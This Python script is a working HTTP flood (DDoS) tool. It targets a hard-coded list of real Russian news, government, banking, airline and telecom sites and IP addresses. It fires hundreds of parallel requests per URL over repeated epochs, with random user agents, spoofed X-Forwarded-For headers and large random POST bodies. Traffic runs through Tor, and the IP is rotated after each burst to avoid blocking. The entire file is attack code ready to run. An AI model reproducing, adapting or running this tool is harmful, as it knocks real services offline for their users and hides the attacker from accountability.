import threading
import time
from typing import Dict, Any, List, Tuple
import requests
import random
import sys
import concurrent.futures
from itertools import repeat
from string import ascii_lowercase, ascii_uppercase
from user_agent import generate_user_agent
from stem import Signal
from stem.control import Controller


# DO NOT TOUCH THESE
#-----------------------------------------------------------------------------------------------------------------------
ALL_LETTERS = []
ALL_LETTERS.extend(ascii_lowercase)
ALL_LETTERS.extend(ascii_uppercase)


HTTP_METHOD_GET = 'get'
HTTP_METHOD_POST = 'post'
HTTP_METHOD_PUT = 'put'


HTTP_STATUS_CODE_SUCCESS = 200
HTTP_STATUS_CODE_UNAUTHORIZED = 401
HTTP_STATUS_CODE_FORBIDDEN = 403
HTTP_STATUS_CODE_NOT_FOUND = 404
HTTP_STATUS_CODE_METHOD_NOT_ALLOWED = 405
HTTP_STATUS_CODE_PROXY_AUTHENTICATION_REQUIRED = 407
HTTP_STATUS_CODE_TOO_MANY_REQUESTS = 429
HTTP_STATUS_CODE_INTERNAL_SERVER_ERROR = 500
HTTP_STATUS_CODE_BAD_GATEWAY = 502
HTTP_STATUS_CODE_SERVICE_UNAVAILABLE = 503
HTTP_STATUS_CODE_CONNECTION_TIMEOUT = -1000
HTTP_STATUS_CODE_PROXY_ERROR = -2000
HTTP_STATUS_CODE_SSL_ERROR = -3000
HTTP_STATUS_CODE_CONNECTION_ERROR = -4000
HTTP_STATUS_CODE_READ_TIMEOUT = -5000
HTTP_STATUS_CODE_TOO_MANY_REDIRECTS = -6000


TOR_CHANGE_IP_LOCK = threading.Lock()
#-----------------------------------------------------------------------------------------------------------------------


# Change configuration here
#-----------------------------------------------------------------------------------------------------------------------
# A list of urls that need to be attacked
# Please note that all of them are either "http" or "https"
LIST_OF_URLS = [
    "http://www.rt.com",
    "https://russian.rt.com/",
    "http://www.cbr.ru",
    "http://rbc.ru",
    "http://www.kremlin.ru",
    "http://www.vesti.ru",
    "https://vsoloviev.ru/",
    "https://tass.ru/",
    "https://tvzvezda.ru/",
    "http://www.smotrim.ru",
    "http://www.vgtrk.ru",
    "https://www.kommersant.ru",
    "https://www.kp.ru/",
    "https://rg.ru/",
    "http://194.190.37.226:80",
    "https://cdnimg.rg.ru/img/content/227/24/50/2p_gorlovka-podval(1)_t_310x206.jpg",
    "https://outercdn.rg.ru/covid-19/result.json?rel=25-02-2022-20&callbackCovid=callbackCovid",
    "https://front.rg.ru/api/currency/result.json?callback=callback&_=1645822786176",
    "http://lenta.ru",
    "https://ria.ru/lenta/",
    "http://gosuslugi.ru",
    "https://yandex.ru/",
    "https://tv.yandex.ru/?utm_source=main_stripe_big",
    "https://tv.yandex.ru/api/sk",
    "https://music.yandex.ru/?utm_source=main_stripe_big",
    "https://auto.ru/?utm_source=main_stripe_big",
    "https://yandex.ru/news/?utm_source=main_stripe_big",
    "https://strm.yandex.ru/probe/jobs?count=5&size=51200",
    "https://akamai.strm.yandex.net/probe/test_file_51200.mp4?size=51200&rnd=3843909514455359",
    "https://www.1tv.ru",
    "https://zakupki.gov.ru/",
    "http://www.interfax.ru/",
    "https://www.interfax.ru/news/2021/06/09",
    "https://www.interfax.ru/moscow/771446",
    "https://tourism.interfax.ru/",
    "https://realty.interfax.ru/",
    "https://www.interfax-russia.ru/",
    "https://academia.interfax.ru/",
    "http://www.interfax-religion.ru/",
    "http://178.248.233.231:80",
    "https://www.interfax.ru/ftproot/textphotos/2022/02/23/usa_700.jpg",
    "http://admin.gazprombank.ru",
    "https://www.gazprombank.ru/",
    "https://www.gazprombank.ru/atms",
    "https://www.gazprombank.ru/offices/21454",
    "https://www.gazprombank.ru/atms/6169985",
    "http://rkn.gov.ru",
    "https://www.mchs.gov.ru/",
    "http://95.173.145.58:80",
    "https://epp.genproc.gov.ru",
    "https://ach.gov.ru",
    "https://www.scrf.gov.ru",
    "https://mil.ru",
    "https://www.aeroflot.com",
    "https://www.aeroflot.ru",
    "https://www.aeroflot.ru/xx-en/special_offers",
    "https://www.aeroflot.ru/xx-en/destination_offers",
    "https://www.aeroflot.ru/xx-en/afl_bonus",
    "https://www.aeroflot.ru/sb/subsidized/app/ru-ru#/search?_k=a6fp8b"
    "https://www.aeroflot.ru/personal/cargo_tracking?_preferredLanguage=en",
    "https://www.aeroflot.ru/ru-ru/news/62263?from=new_main",
    "https://www.aeroflot.ru/sb/app/xx-en#/search?extended=false&adults=5&children=0&infants=0&award=N&cabin=econom&autosearch=Y&use_voucher=N&routes=MOW.20220317.LED-LED.20220422.MOW&_k=2ns9j8",
    "https://login.mts.ru/",
    "https://mts.ru/",
    "https://moskva.mts.ru/personal",
    "https://spb.mts.ru/personal",
    "https://lk.spb.mts.ru/api.php?r=site/login",
    "https://spb.mts.ru/business/mobilnaya-svyaz/korporativnie-tarifi-i-opcii/umnij_business_m",
    "https://spb.mts.ru/business/svyaz/specialnie-predlozheniya/rekomenduem/biznes-abonement",
    "https://www.mtsbank.ru/chastnim-licam/karti/credit-mts-cashback/?utm_source=mtsru&utm_medium=partner&utm_campaign=menu_finuslugi&utm_content=cc_cashback",
    "https://shop.mts.ru/catalog/smartfony/xiaomi/?utm_source=mts_ru&utm_medium=ref&utm_campaign=inhouse_shop&utm_content=header&utm_term=smartfony_xiaomi&utm_referrer=https%3A%2F%2Fspb.mts.ru%2Fpersonal"
]

# How many cycles (epochs) of attacks should be performed
# This value can be ignored, you can control the attack by stopping docker-compose at any time
NUMBER_OF_EPOCHS = 10

# How many URLs from your list will be attacked in parallel
PARALLEL_LIST_OF_URLS_WORKERS = 2

# Min/max values that determine how many requests can be simultaneously sent to a single URL
PARALLEL_SINGLE_URL_MIN_REQUESTS = 150
PARALLEL_SINGLE_URL_MAX_REQUESTS = 400

# How many requests on the same URL will be processed in parallel
PARALLEL_SINGLE_URL_WORKERS = 50

# Should we use tor?
# The default values is True, and we will print out warnings if you disable it
# Use at your own risk, only if you know what you're doing
ENABLE_TOR = True
#-----------------------------------------------------------------------------------------------------------------------



# Random helper functions
#-----------------------------------------------------------------------------------------------------------------------
def get_random_user_agent() -> str:
    return str(generate_user_agent())


def get_random_ip() -> str:
    return '.'.join([str(random.randint(0,255)) for i in range(0,4)])


def get_random_string(size: int) -> str:
    return ''.join([random.choice(ALL_LETTERS) for i in range(0, size)])


def get_random_body(min_number_of_keys: int = 50, max_number_of_keys: int = 400, min_key_size: int = 100, max_key_size: int = 800, min_value_size: int = 400, max_value_size: int = 16000) -> Dict[str, str]:
    body = {}
    number_of_keys = random.randint(min_number_of_keys, max_number_of_keys)
    for ik in range(0, number_of_keys):
        key_size = random.randint(min_key_size, max_key_size)
        value_size = random.randint(min_value_size, max_value_size)
        key = get_random_string(key_size)
        value = get_random_string(value_size)
        body[key] = value
    return body


def get_headers() -> Dict[str, str]:
    return {
        'User-Agent': get_random_user_agent(),
        'X-Forwarded-For': get_random_ip(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-us,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Keep-Alive': '115',
        'Connection': 'keep-alive',
    }


def get_proxies_tor() -> Dict[str, str]:
    return {
        'https': '127.0.0.1:8118'
    }
#-----------------------------------------------------------------------------------------------------------------------



# Request
#-----------------------------------------------------------------------------------------------------------------------
def make_request_raw(http_method: str, url: str, body: Dict = {}, headers: Dict = {}, proxies: Dict = {}, timeout: int = 15) -> requests.Response:
    if len(proxies) == 0:
        print("make_request_raw(): Warning! No proxies were set for request " + http_method + " " + url)
    http_method = http_method.strip().lower()
    if http_method == HTTP_METHOD_GET:
        return requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
    elif http_method == HTTP_METHOD_POST:
        return requests.post(url, data=body, headers=headers, proxies=proxies, timeout=timeout)
    elif http_method == HTTP_METHOD_PUT:
        return requests.put(url, data=body, headers=headers, proxies=proxies, timeout=timeout)
    else:
        raise RuntimeError("Unknown http_method=" + str(http_method))


def make_request(http_method: str, url: str, body: Dict = {}, headers: Dict = {}, proxies: Dict = {}, timeout: int = 15) -> (int, Dict[str, Any], bytes):
    try:
        response = make_request_raw(http_method, url, body=body, headers=headers, proxies=proxies, timeout=timeout)
    except requests.exceptions.ConnectTimeout as e1:
        return (HTTP_STATUS_CODE_CONNECTION_TIMEOUT, None, None)
    except requests.exceptions.ProxyError as e2:
        return (HTTP_STATUS_CODE_PROXY_ERROR, None, None)
    except requests.exceptions.SSLError as e3:
        return (HTTP_STATUS_CODE_SSL_ERROR, None, None)
    except requests.exceptions.ConnectionError as e4:
        return (HTTP_STATUS_CODE_CONNECTION_ERROR, None, None)
    except requests.exceptions.ReadTimeout as e5:
        return (HTTP_STATUS_CODE_READ_TIMEOUT, None, None)
    except requests.exceptions.TooManyRedirects as e6:
        return (HTTP_STATUS_CODE_TOO_MANY_REDIRECTS, None, None)


    response_json = None
    try:
        response_json = response.json()
    except:
        pass
    response_content = None
    try:
        response_content = response.content
    except:
        pass
    return (response.status_code, response_json, response_content)


def make_requests_parallel(http_method: str, url: str, number_of_requests: int, max_worker_count: int, body: Dict = {}, headers: Dict = {}, proxies: Dict = {}, timeout: int = 15) -> (List[Tuple[int, Dict[str, Any], bytes]], float):
    t1 = time.time()
    results = []
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_worker_count)
    for result in executor.map(make_request, repeat(http_method, number_of_requests), repeat(url, number_of_requests), repeat(body), repeat(headers), repeat(proxies), repeat(timeout)):
        results.append(result)
    t2 = time.time()
    t = t2 - t1
    return results, t


def debug_stats(http_method: str, url: str, results: List[Tuple[int, Dict[str, Any], bytes]], t: float):
    print('debug_stats(): ----------------------- ')
    print('debug_stats(): ' + http_method + ' ' + url)
    success_responses = len([r for r in results if 200 <= r[0] <= 299])
    redirect_responses = len([r for r in results if 300 <= r[0] <= 399])
    client_error_responses = len([r for r in results if 400 <= r[0] <= 499])
    not_found_responses = len([r for r in results if r[0] == HTTP_STATUS_CODE_NOT_FOUND])
    method_not_allowed_responses = len([r for r in results if r[0] == HTTP_STATUS_CODE_METHOD_NOT_ALLOWED])
    server_error_responses = len([r for r in results if 500 <= r[0] <= 599])
    connection_timeouts = len([r for r in results if r[0] == HTTP_STATUS_CODE_CONNECTION_TIMEOUT])
    proxy_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_PROXY_ERROR])
    ssl_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_SSL_ERROR])
    connection_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_CONNECTION_ERROR])
    read_timeouts = len([r for r in results if r[0] == HTTP_STATUS_CODE_READ_TIMEOUT])
    too_many_redirects = len([r for r in results if r[0] == HTTP_STATUS_CODE_TOO_MANY_REDIRECTS])

    print('debug_stats(): Total responses count: ' + str(len(results)))
    if success_responses > 0:
        print('debug_stats(): Success responses: ' + str(success_responses))
    if redirect_responses > 0:
        print('debug_stats(): Redirect responses: ' + str(redirect_responses))

    if client_error_responses > 0:
        print('debug_stats(): Client error responses (4XX): ' + str(client_error_responses))
    if not_found_responses > 0:
        print('debug_stats(): Not found responses (' + str(HTTP_STATUS_CODE_NOT_FOUND) + '): ' + str(not_found_responses))
    if method_not_allowed_responses > 0:
        print('debug_stats(): Method not allowed responses (' + str(HTTP_STATUS_CODE_METHOD_NOT_ALLOWED) + '): ' + str(method_not_allowed_responses))

    if server_error_responses > 0:
        print('debug_stats(): Server error responses (5XX): ' + str(server_error_responses))

    if connection_timeouts > 0:
        print('debug_stats(): Connection timeouts (by client): ' + str(connection_timeouts))
    if proxy_errors > 0:
        print('debug_stats(): Proxy errors (by client): ' + str(proxy_errors))
    if ssl_errors > 0:
        print('debug_stats(): SSL errors (by client): ' + str(ssl_errors))
    if connection_errors > 0:
        print('debug_stats(): Connections errors (by client): ' + str(connection_errors))
    if read_timeouts > 0:
        print('debug_stats(): Read timeouts (by client): ' + str(read_timeouts))
    if too_many_redirects > 0:
        print('debug_stats(): Too many redirects (by client): ' + str(too_many_redirects))

    print('debug_stats(): Execution time is ' + str(round(t, 2)) + ' s,' + ' speed is ' + str(round(len(results) / t, 2)) + ' r/s')
    print('debug_stats(): ')
#-----------------------------------------------------------------------------------------------------------------------



# TOR helpers
#-----------------------------------------------------------------------------------------------------------------------
def change_ip_tor():
    with TOR_CHANGE_IP_LOCK:
        time.sleep(1)
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='my password')
            controller.signal(Signal.NEWNYM)
        print("switch_tor_ip(): Generated new IP")
        time.sleep(1)

def check_my_ip_with_tor() -> (int, Dict[str, Any], bytes):
    result = make_request('GET', 'https://api.myip.com/', proxies=get_proxies_tor())
    print("check_my_ip_with_tor(): Your current TOR IP address: " + str(result))
    return result
#-----------------------------------------------------------------------------------------------------------------------



# Testing
#-----------------------------------------------------------------------------------------------------------------------
def test_get_random_user_agent():
    print('-----------------------------------------------------------------------------------------------------------')
    print('test_get_random_user_agent(): Started')
    print('test_get_random_user_agent(): Generated UA', get_random_user_agent())
    print('test_get_random_user_agent(): Generated UA', get_random_user_agent())
    print('test_get_random_user_agent(): Generated UA', get_random_user_agent())
    print('test_get_random_user_agent(): Generated UA', get_random_user_agent())
    print('test_get_random_user_agent(): Ended')

def test_get_random_ip():
    print('-----------------------------------------------------------------------------------------------------------')
    print('test_get_random_ip(): Started')
    print('test_get_random_ip(): Generated IP', get_random_ip())
    print('test_get_random_ip(): Generated IP', get_random_ip())
    print('test_get_random_ip(): Generated IP', get_random_ip())
    print('test_get_random_ip(): Generated IP', get_random_ip())
    print('test_get_random_ip(): Ended')

def test_get_random_string():
    print('-----------------------------------------------------------------------------------------------------------')
    print('test_get_random_string(): Started')
    print('test_get_random_string(): Generated string', get_random_string(10))
    print('test_get_random_string(): Generated string', get_random_string(20))
    print('test_get_random_string(): Generated string', get_random_string(30))
    print('test_get_random_string(): Generated string', get_random_string(100))
    print('test_get_random_string(): Ended')

def test_get_random_body():
    print('-----------------------------------------------------------------------------------------------------------')
    print('test_get_random_body(): Started')
    for i in range(0, 3):
        body = get_random_body()
        print('test_get_random_body(): Generated body with size of dict', sys.getsizeof(body), 'bytes, and size of string', sys.getsizeof(str(body)), 'bytes')
    print('test_get_random_body(): Ended')

def test_global():
    test_get_random_user_agent()
    print('')
    test_get_random_ip()
    print('')
    test_get_random_string()
    print('')
    test_get_random_body()
#-----------------------------------------------------------------------------------------------------------------------



# Attack mode
#-----------------------------------------------------------------------------------------------------------------------
def attack_single(http_method_and_url: Tuple[str, str], use_tor: bool):
    http_method = http_method_and_url[0]
    url = http_method_and_url[1]
    number_of_requests = random.randint(PARALLEL_SINGLE_URL_MIN_REQUESTS, PARALLEL_SINGLE_URL_MAX_REQUESTS)
    max_worker_count = PARALLEL_SINGLE_URL_WORKERS

    proxies = {}
    if use_tor:
        proxies = get_proxies_tor()

    if http_method == HTTP_METHOD_GET:
        results, t = make_requests_parallel(http_method, url, number_of_requests, max_worker_count, headers=get_headers(), proxies=proxies, timeout=7)
    else:
        results, t = make_requests_parallel(http_method, url, number_of_requests, max_worker_count, body=get_random_body(), headers=get_headers(), proxies=proxies, timeout=7)

    debug_stats(http_method, url, results, t)

    if use_tor:
        change_ip_tor()


def attack_multiple(list_of_http_methods_and_urls: List[Tuple[str, str]], use_tor: bool):
    results = []
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=PARALLEL_LIST_OF_URLS_WORKERS)
    for result in executor.map(attack_single, list_of_http_methods_and_urls, repeat(use_tor)):
        results.append(result)
#-----------------------------------------------------------------------------------------------------------------------



# MAIN ATTACK
for epoch in range(0, NUMBER_OF_EPOCHS):
    print('\n\n------- Attack Epoch #'  + str(epoch) + ' -------')
    check_my_ip_with_tor()

    # Build URLs
    list_of_http_methods_and_urls = [("GET", url) for url in LIST_OF_URLS]
    random.shuffle(list_of_http_methods_and_urls)

    # Run attack
    attack_multiple(list_of_http_methods_and_urls, ENABLE_TOR)
